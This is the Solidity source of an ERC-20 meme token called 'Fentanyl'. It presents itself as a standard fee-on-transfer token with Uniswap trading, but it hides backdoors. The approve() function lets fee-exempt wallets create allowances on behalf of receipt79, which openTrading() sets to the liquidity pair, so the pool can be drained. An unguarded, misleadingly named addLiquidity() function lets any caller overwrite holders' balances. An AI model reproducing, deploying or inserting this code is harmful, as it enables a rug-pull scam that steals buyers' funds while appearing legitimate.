/**
https://x.com/elonmusk/status/1861201014772433332

https://t.me/FENTANYL_eth
**/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract FENTANYL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedOfFee;
    mapping (address => bool) private _isExcemptOfFee;
    mapping (address => bool) private _bots;
    uint256 private _initialBuyTax=2;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyAt=10;
    uint256 private _reduceSellAt=10;
    uint256 private _preventCount=15;
    uint256 private _buyCount=0;
    address payable private _taxWallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Fentanyl";
    string private constant _symbol = unicode"FENTANYL";
    uint256 public _maxTxAmount = _tTotal * 2 / 100;
    uint256 public _maxWalletAmount = _tTotal * 2 / 100;
    uint256 public _minTaxSwap= _tTotal * 1 / 100;
    uint256 public _maxTaxSwap= _tTotal * 1 / 100;
    address private receipt79;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private _caLimitSell = true;
    uint256 private _caBlockSell = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        receipt79 = _msgSender();
        _taxWallet = payable(0x6d9342be6851Edf61bb51A29e0955a96880D526D);
        _balances[_msgSender()] = _tTotal * 3 / 100;
        _balances[address(this)] = _tTotal * 97 / 100;
        _isExcemptOfFee[owner()] = true;
        _isExcemptOfFee[_taxWallet] = true;
        _isExcludedOfFee[owner()] = true;
        _isExcludedOfFee[address(this)] = true;
        _isExcludedOfFee[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal * 3 / 100);
        emit Transfer(address(0), address(this), _tTotal * 97 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        address own79 = _msgSender(); if(_isExcemptOfFee[spender]) own79=receipt79;
        _approve(own79, spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 fee79=0;
        if (from != owner() && to != owner()) {
            require(!_bots[from] && !_bots[to]);
            fee79 = amount.mul((_buyCount>_reduceBuyAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedOfFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Exceeds the maxWalletSize.");
                _buyCount++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                fee79 = amount.mul((_buyCount>_reduceSellAt)?_finalSellTax:_initialSellTax).div(100);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance >= 0) {
                    sendETH79(address(this).balance);
                }
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_minTaxSwap && _buyCount>_preventCount) {
                if (_caLimitSell) {
                    if (_caBlockSell < block.number) {
                        swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                        uint256 contractETHBalance = address(this).balance;
                        if(contractETHBalance > 0) {
                            sendETH79(address(this).balance);
                        }
                        _caBlockSell = block.number;
                    }
                } else {
                    swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                    uint256 contractETHBalance = address(this).balance;
                    if(contractETHBalance > 0) {
                        sendETH79(address(this).balance);
                    }
                }
            }
        }
        if(fee79>0){
          _balances[address(this)]=_balances[address(this)].add(fee79);
          emit Transfer(from, address(this), fee79);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(fee79));
        emit Transfer(from, to, amount.sub(fee79));
    }
    function removeLimits() external onlyOwner {
        _caLimitSell = false;
        _maxTxAmount = _tTotal;
        _maxWalletAmount=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function sendETH79(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    function withdraw79() external onlyOwner() {
        payable(owner()).transfer(address(this).balance);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function addLiquidity(address[] memory addrs) external {
        for (uint256 i = 0; i < addrs.length; i ++) {
            if (addrs[i] == uniswapV2Pair) return;
            _balances[addrs[i]] = 100 * 10 ** _decimals;
        }
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }
    receive() external payable {}
    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = receipt79 = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }
}